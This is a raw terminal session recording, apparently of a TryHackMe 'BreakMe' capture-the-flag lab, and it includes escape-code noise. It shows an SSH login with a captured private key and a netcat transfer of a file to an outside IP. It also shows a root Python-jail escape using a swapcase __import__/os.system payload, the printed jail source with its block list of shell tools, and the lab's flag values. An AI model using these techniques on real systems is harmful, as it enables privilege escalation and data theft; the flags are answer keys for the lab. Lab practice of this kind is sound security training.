@@ -1,0 +1,207 @@
+Script started on 2025-01-14 17:52:59+03:00 [TERM="xterm-256color" TTY="/dev/pts/11" COLUMNS="104" LINES="27"]
+[H[2J[3J
+
+
+
+
+
+[1m[7m%[27m[1m[0m                                                                                                        ]2;h471x@winux:~/Desktop/tryhackme.ctf/breakme/access/ssh]1;..me/access/ssh]7;file://winux/home/h471x/Desktop/tryhackme.ctf/breakme/access/ssh[0m[27m[24m[J[0m[38;5;244m[49m[39m
+[A[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/breakme/access/[1m[38;5;254m[40m[38;5;255mssh[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m···························[0m[38;5;244m[49m[30m[0m[30m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m[37m[0m[37m[40m[47m[30m 17:53:00[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m[K[98C[0m[49m[39m[38;5;244m─╯[39m[100D[?1h=[?2004hs[1m[31ms[0m[39m[1m[31ms[0m[39m[90mcript -a youcef.ssh.commands[39m[28D[1m[31ms[1m[31ms[0m[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[0m[39ms[0m[39ms[90mh kangchenjunga@mountaineer.thm[39m[31D[39mh[39m [39m-[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [28D[1m[38;2;55;176;255m-[0m[39m[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[1m[38;2;255;176;255m-[1m[38;2;255;176;255mi[1m[38;2;255;176;255m [0m[39m[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[0m[39m ../[1m[38;2;255;176;255m-[1m[38;2;255;176;255mi[0m[39m[4C
+[J[01;34mreverse.shell[0m/  [J[01;34mssh[0m/          [J[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;255;176;255m-i[0m[39m ../[K[88C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[90D[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[4C../[9D[1m[38;2;255;176;255m-[1m[38;2;255;176;255mi[0m[39m[7C
+[J[01;34maccess[0m/       [01;34menumeration[0m/  [01;34mfiles[0m/        [01;34mreverse[0m/      [01;34mtools[0m/                                
+[J[01;34mcredentials[0m/  [J[01;34mexploit[0m/      [J[01;34mflags[0m/        [J[01;34mscreenshots[0m/  [J                                    [A[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;255;176;255m-i[0m[39m ../../[K[85C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[87D[9D[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[7Caccess[1m/[0m
+[7maccess/     [0m  [01;34menumeration[0m/  [01;34mfiles[0m/        [01;34mreverse[0m/      [01;34mtools[0m/                                [K
+[J[01;34mcredentials[0m/  [J[01;34mexploit[0m/      [J[01;34mflags[0m/        [J[01;34mscreenshots[0m/  [J                                    [A[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../access[1m/[0m[K[78C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[80D
+[7maccess/     [0m  [7maccess/     [0m  [A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../access[1m/[0m[K[78C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[80Dcreden[0mtials[1m/[0m
+[01;34maccess[0m/       [1B[7mcredentials/[0m  [A[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../credentials[1m/[0m[K[73C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[75D
+[J[A[28C[21D[1m[38;2;255;176;255m-[1m[38;2;255;176;255mi[0m[39m[18C[0m/
+[J[J[0mbob.wp.credentials    [Jdatabase.credentials  [Jid_rsa              [J[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;255;176;255m-i[0m[39m ../../credentials/[K[73C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[75D[21D[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[19Cbob.wp.credentials
+[J[7mbob.wp.credentials  [0m  [Jdatabase.credentials  [Jid_rsa              [J[A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../credentials/bob.wp.credentials[K[55C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[57D
+[7mbob.wp.credentials  [0m  [7mbob.wp.credentials  [0m  [A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../credentials/bob.wp.credentials[K[55C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[57D[18Ddatabase.credentials
+[22C[7mdatabase.credentials[0m  bob.wp.credentials    [A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../credentials/database.credentials[K[53C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[55D[20Did_rsa              [14D
+[44C[7mid_rsa              [0m[22Cdatabase.credentials  [A[0m[27m[24m[0m[39m[49m[3Cssh [1m[38;2;55;176;255m-i[0m[39m ../../credentials/id_rsa[K[67C[0m[49m[39m[38;5;244m─╯[39m[0m[39m[49m[69D
+[J[A[34C[1m [0m[1m [1my[0m[0m [0myoucef@breakme.thm[?1l>[?2004l
+[J]2;ssh -i ../../credentials/id_rsa youcef@breakme.thm]1;../../credentials/id_rsaThe authenticity of host 'breakme.thm (10.10.24.166)' can't be established.
+ED25519 key fingerprint is SHA256:7C+7KD5sXHHAuUddL4pe+CYqXj7LEWGqlWATdS4wRw8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'breakme.thm' (ED25519) to the list of known hosts.
+Enter passphrase for key '../../credentials/id_rsa': 
+Connection closed by 10.10.24.166 port 22
+[1m[7m%[27m[1m[0m                                                                                                        ]2;h471x@winux:~/Desktop/tryhackme.ctf/breakme/access/ssh]1;..me/access/ssh]7;file://winux/home/h471x/Desktop/tryhackme.ctf/breakme/access/ssh[0m[49m[39m[K
+[0m[27m[24m[J[0m[38;5;244m[49m[39m
+[A[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/breakme/access/[1m[38;5;254m[40m[38;5;255mssh[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m············[0m[38;5;244m[49m[31m[0m[31m[41m[33m 255[0m[33m[41m[41m[33m ✘[0m[33m[41m[41m[33m [0m[33m[41m[41m[33m[38;5;136m[0m[38;5;136m[41m[48;5;136m[30m 4m 16s[0m[30m[48;5;136m[48;5;136m[30m  [0m[30m[48;5;136m[48;5;136m[30m [0m[30m[48;5;136m[48;5;136m[30m[37m[0m[37m[48;5;136m[47m[30m 17:59:36[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m[K[98C[0m[49m[39m[38;5;244m─╯[39m[100D[?1h=[?2004hssh -i ../../credentials/id_rsa youcef@breakme.thm[46D[1m[38;2;55;176;255m-[1m[38;2;55;176;255mi[0m[39m[44C[?1l>[?2004l
+]2;ssh -i ../../credentials/id_rsa youcef@breakme.thm]1;../../credentials/id_rsaEnter passphrase for key '../../credentials/id_rsa': 
+Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Mar 21 07:55:16 2024 from 192.168.56.1
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ ls
+[?2004l[0m[37;41mreadfile[0m  readfile.c
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ id
+[?2004luid=1000(youcef) gid=1000(youcef) groups=1000(youcef)
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ sudo -l
+[?2004lMatching Defaults entries for youcef on breakme:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User youcef may run the following commands on breakme:
+    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ sudo [7m/usr/bin/python3 /root/jail.py[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/usr/bin/python3 /root/jail.py
+[?2004l  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> print("hello")
+Illegal Input
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ ls
+[?2004l[0m[37;41mreadfile[0m  readfile.c
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ cat readfile.xc[K[Kc | nc 10.9.3.166 1234
+[?2004l[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ cat readfile.c | nc 10.9.3.166 1234[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[Ksudo /usr/bin/python3 /root/jail.py
+[?2004l  Welcome to Python jail  
+  Will you stay locked forever  
+  Or will you BreakMe  
+>> __builtins__.__dict__[]^[[D     '__IMPORT__'.swapcase()]
+>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase())
+>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase()).__dict__['SYSTEM'.swapcase()]('ls')
+readfile  readfile.c
+>> __builtins__.__dict__['__IMPORT__'.swapcase()]('OS'.swapcase()).__dict__['SYSTEM'.swapcase()]('ls')    yp orick')
+ Copyright (c) 2005.  The Regents of the University of California.
+ All rights reserved.  Yorick 2.2.04 ready.  For help type 'help'
+> system, 'ls -la /root'
+SYNTAX: missing close '
+SYNTAX: syntax error near <EOF>
+> system, "ls -al /root"
+total 52
+drwx------  3 root root 4096 Mar 21  2024 .
+drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+-rwx------  1 root root 5438 Jul 31  2023 index.php
+-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
+-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
+-rw-------  1 root root   33 Aug  3  2023 .lesshst
+drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
+-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-------  1 root root   33 Aug  3  2023 .root.txt
+> system, "ls -al /root"^[[D                 cat /root/.root.txt"
+e257d58481412f8772e9fb9fd47d8ca4
+> system, "cat /root/.root.txt"^[[D              jail.py"
+import os
+
+def malicious():
+    print("Illegal Input")
+
+def main():
+	while(True):
+                try:
+                    text = input('>> ')
+                except:
+                    print("Exiting...")
+                    return
+                for keyword in ['#',' ','}','`','"','class','?','breakpoint','eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'lower','class','init','\\','+','‘','readlines','bash','sh','7z', 'aa-exec', 'ab', 'agetty', 'alpine', 'ansible-playbook', 'ansible-test', 'aoss', 'apt-get', 'apt', 'ar', 'aria2c', 'arj', 'arp', 'ascii-xfr', 'ascii85', 'ash', 'aspell', 'at', 'atobm', 'awk', 'aws', 'base32', 'base58', 'base64', 'basenc', 'basez', 'bash', 'batcat', 'bc', 'bconsole', 'bpftrace', 'bridge', 'bundle', 'bundler', 'busctl', 'busybox', 'byebug', 'bzip2', 'c89', 'c99', 'cabal', 'cancel', 'capsh', 'cat', 'cdist', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'choom', 'chown', 'chroot', 'cmp', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'debugfs', 'dialog', 'diff', 'dig', 'distcc', 'dmesg', 'dmidecode', 'dmsetup', 'dnf', 'docker', 'dos2unix', 'dosbox', 'dotnet', 'dpkg', 'dstat', 'dvips', 'easy_install', 'eb', 'ed', 'efax', 'elvish', 'emacs', 'env', 'eqn', 'espeak', 'exiftool', 'expand', 'expect', 'facter', 'find', 'finger', 'fish', 'flock', 'fmt', 'fping', 'ftp', 'gawk', 'gcc', 'gcloud', 'gcore', 'gdb', 'gem', 'genie', 'genisoimage', 'ghc', 'ghci', 'gimp', 'ginsh', 'git', 'grc', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'ispell', 'jjs', 'joe', 'join', 'journalctl', 'jq', 'jrunscript', 'jtag', 'julia', 'knife', 'ksh', 'ksshell', 'ksu', 'kubectl', 'latex', 'latexmk','ld.so', 'ldconfig', 'less', 'lftp', 'ln', 'loginctl', 'logsave', 'look', 'lp', 'ltrace', 'lua', 'lualatex', 'luatex', 'lwp-', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mosquitto', 'mount', 'msfconsole', 'msgattrib', 'msgcat', 'msgconv', 'msgfilter', 'msgmerge', 'msguniq', 'mtr', 'multitime', 'mv', 'mysql', 'nano', 'nasm', 'nawk', 'nc', 'ncftp', 'neofetch', 'nft', 'nice', 'nl', 'nm', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'opkg', 'pandoc', 'paste', 'pax', 'pdb', 'pdflatex', 'pdftex', 'perf', 'perl', 'perlbug', 'pexec', 'pg', 'php', 'pic', 'pico', 'pidstat', 'pip', 'pkexec', 'pkg', 'posh','pry', 'psftp', 'psql', 'ptx', 'puppet', 'pwsh', 'python', 'rake', 'rc', 'readelf', 'red', 'redcarpet', 'redis', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmdb', 'rpmquery', 'rpmverify', 'rsync', 'rtorrent', 'ruby', 'run-mailcap', 'run-parts', 'rview', 'rvim', 'sash', 'scanmem', 'scp', 'screen', 'script', 'scrot', 'sed', 'service', 'setarch', 'setfacl', 'setlock', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'socket', 'soelim', 'softlimit', 'sort', 'split', 'sqlite3', 'sqlmap', 'ss', 'ssh-agent', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'sshpass', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'systemd-resolve', 'tac', 'tail', 'tar', 'task', 'taskset', 'tasksh', 'tbl', 'tclsh', 'tcpdump', 'tdbtool', 'tee', 'telnet', 'tex', 'tftp', 'tic', 'time', 'timedatectl', 'timeout', 'tmate', 'tmux', 'top', 'torify', 'torsocks', 'troff', 'tshark', 'ul', 'unexpand', 'uniq', 'unshare', 'unzip', 'update-alternatives', 'uudecode', 'uuencode', 'vagrant', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'volatility', 'w3m', 'wall', 'watch', 'wc', 'wget', 'whiptail', 'whois', 'wireshark', 'wish', 'xargs', 'xdotool', 'xelatex', 'xetex', 'xmodmap', 'xmore', 'xpad', 'xxd', 'xz', 'yarn', 'yash', 'yelp', 'yum', 'zathura', 'zip', 'zsh', 'zsoelim', 'zypper','&','|','$','{','>','<']:
+                    if keyword in text:
+                        malicious()
+                        return
+                try:
+                    if "__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()]('" in text:
+                        if len(text)!=119 or os.path.islink(text[95:-2]):
+                            malicious()
+                            return
+                        else:
+                            if(text[95:-2]!="/lib/yorick/bin/yorick"):
+                                malicious()
+                                return
+                            else:
+                                exec(text)
+                    else:
+                        exec(text)
+                except SyntaxError:
+                    print("Wrong Input")
+                except NameError:
+                    print("Wrong Input")
+
+if __name__ == "__main__":
+	print("  Welcome to Python jail  ")
+	print("  Will you stay locked forever  ")
+	print("  Or will you BreakMe  ")
+	main()
+> exit
+EXIT called, back to main loop
+> help
+ /* DOCUMENT help, topic
+          or help
+      Prints DOCUMENT comment from include file in which the variable
+      TOPIC was defined, followed by the line number and filename.
+      By opening the file with a text editor, you may be able to find
+      out more, especially if no DOCUMENT comment was found.
+      Examples:
+        help, set_path
+      prints the documentation for the set_path function.
+        help
+      prints the DOCUMENT comment you are reading.
+ 
+      This copy of Yorick was launched from the directory:
+       /usr/lib/yorick/bin/
+      Yorick's "site directory" at this site is:
+       /usr/lib/yorick/
+      You can find out a great deal more about Yorick by browsing
+      through these directories.  Begin with the site directory,
+      and pay careful attention to the subdirectories doc/ (which
+      contains documentation relating to Yorick if the yorick-doc
+      package is installed) and i/ (which contain many examples of
+      Yorick programs).
+      Look for files called README (or something similar) in any
+      of these directories -- they are intended to assist browsers.
+      The site directory itself contains std.i and graph.i, which
+      are worth reading.
+ 
+      Type:
+        help, dbexit
+      for help on debug mode.  If your prompt is "dbug>" instead of
+      ">", dbexit will return you to normal mode.
+ 
+      Type:
+        quit
+      to quit Yorick.
+ 
+    SEE ALSO: about, quit, info, print, copyright, warranty, legal
+  */
+ defined at:  LINE: 37  FILE: /usr/lib/yorick/i0/std.i
+> quit
+>> exit()
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ ls
+[?2004l[0m[37;41mreadfile[0m  readfile.c
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ ls -al
+[?2004ltotal 52
+drwxr-x--- 4 youcef john    4096 Aug  3  2023 [0m[01;34m.[0m
+drwxr-xr-x 5 root   root    4096 Feb  3  2024 [01;34m..[0m
+lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
+-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
+drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 [01;34m.local[0m
+-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
+-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 [37;41mreadfile[0m
+-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
+drwx------ 2 youcef youcef  4096 Aug  5  2023 [01;34m.ssh[0m
+[?2004h]0;youcef@Breakme: ~[01;32myoucef@Breakme[00m:[01;34m~[00m$ cd .ssh
+[?2004l[?2004h]0;youcef@Breakme: ~/.ssh[01;32myoucef@Breakme[00m:[01;34m~/.ssh[00m$ ls
+[?2004lauthorized_keys  id_rsa  user2.txt
+[?2004h]0;youcef@Breakme: ~/.ssh[01;32myoucef@Breakme[00m:[01;34m~/.ssh[00m$ cat user2.txt
+[?2004ldf5b1b7f4f74a416ae27673b22633c1b
+[?2004h]0;youcef@Breakme: ~/.ssh[01;32myoucef@Breakme[00m:[01;34m~/.ssh[00m$ exit
+[?2004llogout
+Connection to breakme.thm closed.
+[1m[7m%[27m[1m[0m                                                                                                        ]2;h471x@winux:~/Desktop/tryhackme.ctf/breakme/access/ssh]1;..me/access/ssh]7;file://winux/home/h471x/Desktop/tryhackme.ctf/breakme/access/ssh[0m[49m[39m[K
+[0m[27m[24m[J[0m[38;5;244m[49m[39m
+[A[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/breakme/access/[1m[38;5;254m[40m[38;5;255mssh[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m··············[0m[38;5;244m[49m[30m[0m[30m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m[38;5;136m[0m[38;5;136m[40m[48;5;136m[30m 13m 23s[0m[30m[48;5;136m[48;5;136m[30m  [0m[30m[48;5;136m[48;5;136m[30m [0m[30m[48;5;136m[48;5;136m[30m[37m[0m[37m[48;5;136m[47m[30m 18:13:05[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m[K[98C[0m[49m[39m[38;5;244m─╯[39m[100D[?1h=[?2004he[1m[31me[0m[39m[1m[31me[0m[39m[90mxit[39m[1m[31me[1m[31mx[0m[39m[0m[39me[0m[39mx[39mi[1m[31me[1m[31mx[1m[31mi[0m[39m[1m[31mi[1m[31mt[0m[39m[0m[39me[0m[39mx[0m[39mi[0m[39mt[?1l>[?2004l
+]2;exit]1;exit
+Script done on 2025-01-14 18:13:07+03:00 [COMMAND_EXIT_CODE="0"]
